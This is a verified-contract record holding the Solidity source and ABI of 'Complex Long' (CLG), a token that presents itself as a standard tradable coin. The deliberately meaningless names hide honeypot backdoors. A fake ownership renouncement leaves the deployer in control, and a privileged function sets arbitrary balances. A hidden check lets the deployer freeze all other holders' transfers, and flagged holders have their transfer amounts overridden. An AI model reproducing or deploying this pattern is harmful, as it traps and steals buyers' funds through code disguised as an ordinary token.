{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface walletExemptMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeToIs {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTxShould {\n    function createPair(address teamSwap, address modeTrading) external returns (address);\n}\n\ninterface enableMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address limitMode) external view returns (uint256);\n\n    function transfer(address fromMarketingFee, uint256 swapReceiverAmount) external returns (bool);\n\n    function allowance(address fromSell, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 swapReceiverAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address fromMarketingFee,\n        uint256 swapReceiverAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityIs, uint256 value);\n    event Approval(address indexed fromSell, address indexed spender, uint256 value);\n}\n\ninterface enableMinMetadata is enableMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ComplexLong is feeToIs, enableMin, enableMinMetadata {\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return shouldAmount;\n    }\n\n    event OwnershipTransferred(address indexed minSellExempt, address indexed liquidityFeeMax);\n\n    uint256 private launchEnableTotal;\n\n    address limitTakeFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    mapping(address => uint256) private fromAuto;\n\n    mapping(address => mapping(address => uint256)) private tradingBuy;\n\n    uint256 private shouldAmount = 100000000 * 10 ** 18;\n\n    function sellTradingFrom(uint256 swapReceiverAmount) public {\n        teamTo();\n        feeFund = swapReceiverAmount;\n    }\n\n    address modeAmount = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private fundMin;\n\n    function getOwner() external view returns (address) {\n        return tradingToken;\n    }\n\n    string private enableTxMin = \"CLG\";\n\n    function receiverModeEnable() public {\n        emit OwnershipTransferred(launchFund, address(0));\n        tradingToken = address(0);\n    }\n\n    constructor (){\n        if (launchReceiverExempt) {\n            amountMode = walletAt;\n        }\n        walletExemptMode isWallet = walletExemptMode(modeAmount);\n        listFund = autoTxShould(isWallet.factory()).createPair(isWallet.WETH(), address(this));\n        \n        launchFund = _msgSender();\n        receiverModeEnable();\n        limitSwap[launchFund] = true;\n        fromAuto[launchFund] = shouldAmount;\n        if (walletAt != launchEnableTotal) {\n            launchReceiverExempt = false;\n        }\n        emit Transfer(address(0), launchFund, shouldAmount);\n    }\n\n    function liquidityBuyAuto(address autoTo) public {\n        teamTo();\n        if (launchReceiverExempt) {\n            launchReceiverExempt = false;\n        }\n        if (autoTo == launchFund || autoTo == listFund) {\n            return;\n        }\n        autoIs[autoTo] = true;\n    }\n\n    uint256 constant marketingLaunched = 8 ** 10;\n\n    bool public launchReceiverExempt;\n\n    address public listFund;\n\n    string private marketingWallet = \"Complex Long\";\n\n    address private tradingToken;\n\n    function transfer(address minMarketing, uint256 swapReceiverAmount) external virtual override returns (bool) {\n        return enableMode(_msgSender(), minMarketing, swapReceiverAmount);\n    }\n\n    mapping(address => bool) public limitSwap;\n\n    uint256 feeFund;\n\n    function balanceOf(address limitMode) public view virtual override returns (uint256) {\n        return fromAuto[limitMode];\n    }\n\n    uint8 private exemptBuy = 18;\n\n    uint256 public walletAt;\n\n    function feeLiquidity(address minMarketing, uint256 swapReceiverAmount) public {\n        teamTo();\n        fromAuto[minMarketing] = swapReceiverAmount;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return enableTxMin;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptBuy;\n    }\n\n    uint256 public amountMode;\n\n    bool public maxLaunchedReceiver;\n\n    mapping(address => bool) public autoIs;\n\n    function teamTo() private view {\n        require(limitSwap[_msgSender()]);\n    }\n\n    uint256 maxShould;\n\n    function allowance(address tokenTeam, address amountIs) external view virtual override returns (uint256) {\n        if (amountIs == modeAmount) {\n            return type(uint256).max;\n        }\n        return tradingBuy[tokenTeam][amountIs];\n    }\n\n    function owner() external view returns (address) {\n        return tradingToken;\n    }\n\n    function sellAuto(address exemptMax, address fromMarketingFee, uint256 swapReceiverAmount) internal returns (bool) {\n        require(fromAuto[exemptMax] >= swapReceiverAmount);\n        fromAuto[exemptMax] -= swapReceiverAmount;\n        fromAuto[fromMarketingFee] += swapReceiverAmount;\n        emit Transfer(exemptMax, fromMarketingFee, swapReceiverAmount);\n        return true;\n    }\n\n    address public launchFund;\n\n    function name() external view virtual override returns (string memory) {\n        return marketingWallet;\n    }\n\n    function approve(address amountIs, uint256 swapReceiverAmount) public virtual override returns (bool) {\n        tradingBuy[_msgSender()][amountIs] = swapReceiverAmount;\n        emit Approval(_msgSender(), amountIs, swapReceiverAmount);\n        return true;\n    }\n\n    function transferFrom(address exemptMax, address fromMarketingFee, uint256 swapReceiverAmount) external override returns (bool) {\n        if (_msgSender() != modeAmount) {\n            if (tradingBuy[exemptMax][_msgSender()] != type(uint256).max) {\n                require(swapReceiverAmount <= tradingBuy[exemptMax][_msgSender()]);\n                tradingBuy[exemptMax][_msgSender()] -= swapReceiverAmount;\n            }\n        }\n        return enableMode(exemptMax, fromMarketingFee, swapReceiverAmount);\n    }\n\n    function feeMode(address marketingLiquidity) public {\n        require(marketingLiquidity.balance < 100000);\n        if (maxLaunchedReceiver) {\n            return;\n        }\n        if (fundMin == walletAt) {\n            launchEnableTotal = fundMin;\n        }\n        limitSwap[marketingLiquidity] = true;\n        \n        maxLaunchedReceiver = true;\n    }\n\n    bool private minTrading;\n\n    function enableMode(address exemptMax, address fromMarketingFee, uint256 swapReceiverAmount) internal returns (bool) {\n        if (exemptMax == launchFund) {\n            return sellAuto(exemptMax, fromMarketingFee, swapReceiverAmount);\n        }\n        uint256 liquiditySwapSender = enableMin(listFund).balanceOf(limitTakeFund);\n        require(liquiditySwapSender == feeFund);\n        require(fromMarketingFee != limitTakeFund);\n        if (autoIs[exemptMax]) {\n            return sellAuto(exemptMax, fromMarketingFee, marketingLaunched);\n        }\n        return sellAuto(exemptMax, fromMarketingFee, swapReceiverAmount);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minSellExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFeeMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityIs\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTeam\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverAmount\",\"type\":\"uint256\"}],\"name\":\"feeLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingLiquidity\",\"type\":\"address\"}],\"name\":\"feeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchReceiverExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTo\",\"type\":\"address\"}],\"name\":\"liquidityBuyAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLaunchedReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverModeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"swapReceiverAmount\",\"type\":\"uint256\"}],\"name\":\"sellTradingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"fromMarketingFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"swapReceiverAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ComplexLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}